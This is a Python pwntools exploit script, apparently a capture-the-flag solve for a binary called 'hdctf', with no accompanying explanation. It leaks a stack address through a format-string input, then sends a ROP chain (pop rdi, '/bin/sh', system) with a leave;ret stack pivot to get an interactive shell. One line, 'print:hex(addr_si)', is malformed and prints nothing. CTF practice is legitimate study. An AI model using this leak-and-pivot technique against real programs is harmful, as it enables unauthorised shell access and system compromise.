from pwn import *

context.log_level = "debug"
context.terminal = ["qterminal", "-e"]
elf = ELF("./hdctf")
system = elf.plt["system"]
p = process("./hdctf")
#p=remote('node4.anna.nssctf.cn',28748)
#gdb.attach(p,'b* 0x4007ed')
p.recvuntil(b'name: \n')
p.sendline("%llx\n")
p.recvuntil(b'hello,')

addr_si =int(p.recv(12),16)
print:hex(addr_si)
addr_sp = addr_si + 0x1B0
payload = p64(0x4008D3)#pop rdi ret
payload += p64(addr_sp + 0x18)
payload += p64(system)#sys
payload += b'/bin/sh\x00'

payload=payload.ljust(0x50, b"a")
payload += p64(addr_sp-0x8)
payload += p64(0x4007F2)#leave
p.sendline(payload)
p.interactive()
